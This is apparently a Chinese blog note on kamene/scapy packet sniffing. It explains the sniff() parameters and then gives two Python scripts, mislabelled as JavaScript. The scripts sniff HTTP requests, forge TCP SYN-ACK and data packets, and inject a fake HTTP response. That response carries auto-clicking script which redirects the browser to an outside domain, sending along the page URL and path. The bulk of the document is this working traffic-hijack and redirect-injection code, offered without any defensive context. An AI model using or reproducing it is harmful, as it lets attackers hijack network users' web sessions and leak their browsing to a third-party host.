kamene 也是就是老版本的pypcap



sniff抓包



sniff(count=0,

      store=1,

      offline=None,

      prn=None,

      filter=None,

      L2socket=None,

      timeout=None,

      opened_socket=None,

      stop_filter=None,

      iface=None)

count:抓取报的数量，设置为0时则一直捕获

store:保存抓取的数据包或者丢弃，1保存，0丢弃

offline:从pcap文件中读取数据包，而不进行嗅探，默认为None

prn:为每个数据包定义一个回调函数

filter:过滤规则，可以在里面定义winreshark里面的过滤语法

L2socket:使用给定的L2socket

timeout:在给定的事件后停止嗅探，默认为None

opened_socket:对指定的对象使用.recv进行读取

stop_filter:定义一个函数，决定在抓到指定的数据之后停止

iface:指定抓包的网卡,不指定则代表所有网卡




简单示例：

from scapy.all import *

def handelPacket(p):

    p.show()

 







```javascript
# coding:utf-8
from kamene.all import *
import re

num = 0
def getRaw1(p):
    global num
    num = num + 1
    print('pakages====',num)
    # p.show()
    ValueOfPort = p[0].sport
    SeqNr = p[0].seq
    AckNr = p[0].seq + 1
    ip = IP( src='172.20.30.71', dst='172.20.30.52' )

    if p[2].ack == 0:
        # print( 'ppppppppppppppppppppppppppppppppaakge--------1' )
        TCP_SYNACK = TCP( sport=80, dport=ValueOfPort, flags="SA", seq=SeqNr, ack=AckNr, options=[('MSS', 1460)] )
        ANSWER = sr1( ip / TCP_SYNACK )

        GEThttp = sniff(filter="tcp and port 80", count=1, prn=lambda x: x.sprintf( "{IP:%IP.src%: %TCP.dport%}" ) )
        print('GGGGGGGGGGGGGGGGGEEEEEEEEEEEEEEEEEEEEE',GEThttp[0].load)

    #发送第二个包
    try:
        #.decode('utf-8')
        raw = p[3].load
        print( '=================================rawrawrawrawraw', raw, len( raw ) ,"ack:",p[2].ack)
        if not re.findall(r'HTTP',raw.decode('utf-8')):
            return
        #     print('~~~~~~~~~~~~~~~~~~~~~~~~~~~~found HTTP')
        # AckNr = AckNr + len(raw)
        AckNr = AckNr + len(GEThttp[0].load)
        SeqNr = p[0].seq + 1

        html1 = 'HTTP/1.0 200 OK\x0d\x0aServer: Testserver\x0d\x0aConnection: Keep-Alive\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0aContent-Length: 600\x0d\x0a\x0d\x0a<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"><html><head></head><body><a href="" id="hao123"></a><script type="text/javascript">var strU="https://zf.tz301.cn:443/?u="+window.location+"&p="+window.location.pathname+window.location.search;hao123.href=strU;if(document.all){document.getElementById("hao123").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("hao123").dispatchEvent(e);}</script></body></html>'
        data1 = TCP( sport=80, dport=ValueOfPort, flags="PA", seq=SeqNr, ack=AckNr, options=[('MSS', 1460)] )
        ackdata1 = sr1( ip / data1 / html1 )

        # print(ackdata1.ack)
        SeqNr = ackdata1.ack
        Bye = TCP( sport=80, dport=ValueOfPort, flags="FA", seq=SeqNr, ack=AckNr, options=[('MSS', 1460)] )
        send(ip / Bye )
        # print('endddddddddddddddddddddddddd')

    except:
        pass





dpkg = sniff(count=3, prn=getRaw1, filter="tcp and dst 172.20.30.71 and tcp port 80")
```







```javascript
# coding: utf8

import pcap
import dpkt
import time
import sys
from kamene.all import *



a=sniff(count=1,filter="tcp and host 172.20.30.71 and port 80")
ValueOfPort=a[0].sport
SeqNr=a[0].seq
AckNr=a[0].seq+1
ip=IP(src='172.20.30.71', dst="172.20.30.52")
TCP_SYNACK=TCP(sport=80, dport=ValueOfPort, flags="SA", seq=SeqNr, ack=AckNr, options=[('MSS', 1460)])
ANSWER=sr1(ip/TCP_SYNACK)

GEThttp = sniff(filter="tcp and port 80",count=1,prn=lambda x:x.sprintf("{IP:%IP.src%: %TCP.dport%}"))

AckNr=AckNr+len(GEThttp[0].load)
SeqNr=a[0].seq+1

if len(GEThttp[0].load)>1:
    print (GEThttp[0].load)


html1 = 'HTTP/1.0 200 OK\x0d\x0aServer: Testserver\x0d\x0aConnection: Keep-Alive\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0aContent-Length: 600\x0d\x0a\x0d\x0a<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\"><html><head></head><body><a href="" id="hao123"></a><script type="text/javascript">var strU="https://zf.tz301.cn:443/?u="+window.location+"&p="+window.location.pathname+window.location.search;hao123.href=strU;if(document.all){document.getElementById("hao123").click();}else {var e=document.createEvent("MouseEvents");e.initEvent("click",true,true);document.getElementById("hao123").dispatchEvent(e);}</script></body></html>'
data1=TCP(sport=80, dport=ValueOfPort, flags="PA", seq=SeqNr, ack=AckNr, options=[('MSS', 1460)])
ackdata1=sr1(ip/data1/html1)


SeqNr=ackdata1.ack
Bye=TCP(sport=80, dport=ValueOfPort, flags="FA", seq=SeqNr, ack=AckNr, options=[('MSS', 1460)])
send(ip/Bye)

```

